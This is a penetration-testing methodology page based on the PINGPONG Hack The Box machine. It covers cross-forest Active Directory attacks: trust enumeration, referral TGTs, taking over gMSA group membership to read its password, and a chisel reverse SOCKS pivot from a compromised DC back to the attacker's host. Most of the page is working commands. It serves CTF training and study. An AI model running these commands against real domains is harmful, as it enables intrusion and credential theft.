---
title: "08 · Cross-Forest Attacks"
---

# 08 · Cross-Forest Attacks (Based On PINGPONG HTB Box)

> Forest trusts open paths between supposedly isolated domains.

!!! note "Phase overview"
    When two forests trust each other, principals from one can request service tickets in the other. Trust direction matters: a one-way trust from PONG → PING means PING users can access PONG resources, not vice versa. Cross-forest exploitation requires pre-caching referral TGTs (krbtgt/FOREIGN.REALM@HOME.REALM) and often a SOCKS pivot via chisel because the foreign DC isn't routable from your VPN.

### 8.1 · Cross-Forest Enumeration

!!! info "Why this works / how it chains"

    First map the trusts (nltest /domain_trusts on Windows; Get-ADTrust if you have RSAT). Then run BloodHound across the trust by passing -d for the foreign realm and tunneling through proxychains if needed.

```bash title="Trust enum + foreign BloodHound"
# Check forest trusts
nltest /domain_trusts
Get-ADTrust -Filter *
impacket-lookupsid -k -no-pass domain.local/user@dc.domain.local 500

# Enumerate foreign forest via trust
proxychains4 -q bloodhound-python \
  -u 'user@ping.htb' -k -no-pass \
  -d pong.htb -ns <INTERNAL_DC_DOMAIN_IP> \
  -dc dc2.pong.htb --zip -c All
```


### 8.2 · Cross-Forest TGT Referral

!!! info "Why this works / how it chains"

    To use a tool against the foreign forest, you need a referral TGT for it. Request krbtgt/PONG.HTB@PING.HTB that gives you a 'tickets-good-in-PONG' TGT signed by PING's keys but trusted by PONG. Once you have it, set KRB5CCNAME and run any Kerberos-aware tool against the foreign DC.

```bash title="Get referral + use against foreign forest"
# Get referral TGT to foreign forest
KRB5CCNAME=user.ccache \
  impacket-getST -k -no-pass \
  -spn 'krbtgt/PONG.HTB@PING.HTB' \
  -dc-ip $PING_DC_IP \
  ping.htb/user

export KRB5CCNAME=user@krbtgt_PONG.HTB@PING.HTB.ccache

# Now use with pong.htb tools
proxychains4 -q bloodyAD \
  --host dc2.pong.htb --dc-ip <INTERNAL_DC_DOMAIN_IP> \
  -d pong.htb -u 'user@ping.htb' -k \
  get search --filter '(objectClass=user)' --attr sAMAccountName
```


### 8.3 · Cross-Forest gMSA Abuse (PINGPONG technique)

!!! info "Why this works / how it chains"

    Combines Phase 6.3 with cross-forest mechanics. Get a referral TGT, then bloodyAD into the foreign forest and grant yourself GenericAll on the group, convert the group type so it can hold foreign SIDs, add your foreign SID. Get a fresh TGT (membership refresh) and you can now read the gMSA password.

!!! warning "What leads here"
    - You own a group in the foreign forest (Owner = implicit WriteDACL)
    - That group controls gMSA membership

```bash title="End-to-end cross-forest gMSA chain"
# c.roberts owns gMSA Managers in pong.htb (cross-forest)
# Owner has implicit WriteDACL

# 1. Get cross-forest referral TGT
impacket-getST -k -no-pass \
  -spn 'krbtgt/pong.htb@PING.HTB' \
  -dc-ip $PING_IP ping.htb/c.roberts
export KRB5CCNAME=c.roberts@krbtgt_PONG.HTB@PING.HTB.ccache

# 2. Grant GenericAll + fix group type + add foreign SID
proxychains4 -q bloodyAD --host dc2.pong.htb --dc-ip <INTERNAL_DC_DOMAIN_IP> \
  -d pong.htb -u 'c.roberts@ping.htb' -k \
  add genericAll 'gMSA Managers' 'c.roberts-SID-from-ping'

# Convert group type to allow foreign members
proxychains4 -q bloodyAD --host dc2.pong.htb --dc-ip <INTERNAL_DC_DOMAIN_IP> \
  -d pong.htb -u 'c.roberts@ping.htb' -k \
  set object 'CN=gMSA Managers,CN=Users,DC=pong,DC=htb' \
  groupType -v -2147483640  # → Universal

proxychains4 -q bloodyAD --host dc2.pong.htb --dc-ip <INTERNAL_DC_DOMAIN_IP> \
  -d pong.htb -u 'c.roberts@ping.htb' -k \
  set object 'CN=gMSA Managers,CN=Users,DC=pong,DC=htb' \
  groupType -v -2147483644  # → DomainLocal

# Add our PING SID
proxychains4 -q bloodyAD --host dc2.pong.htb --dc-ip <INTERNAL_DC_DOMAIN_IP> \
  -d pong.htb -u 'c.roberts@ping.htb' -k \
  add groupMember 'CN=gMSA Managers,CN=Users,DC=pong,DC=htb' \
  'c.roberts-SID'

# 3. Get fresh TGT (membership refresh)
# Then read gMSA password and derive keys
```


### 8.4 · SOCKS Pivot with Chisel

!!! info "Why this works / how it chains"

    When the foreign DC isn't directly routable, chisel gives you a SOCKS5 proxy through a compromised intermediate host. Server runs on Kali (--reverse so the client initiates), client runs on the intermediate. Then add socks5 127.0.0.1 1080 to /etc/proxychains4.conf and prefix every Kerberos tool with proxychains4 -q.

```bash title="Reverse SOCKS5 pivot"
# Kali - start chisel server
./chisel server -p 8888 --reverse

# Target DC (via evil-winrm upload)
upload /path/to/chisel.exe
.\chisel.exe client YOUR_TUN0_IP:8888 R:1080:socks

# Configure proxychains
echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf

# All internal tools go through proxychains
proxychains4 -q <any_tool> targeting internal host
```

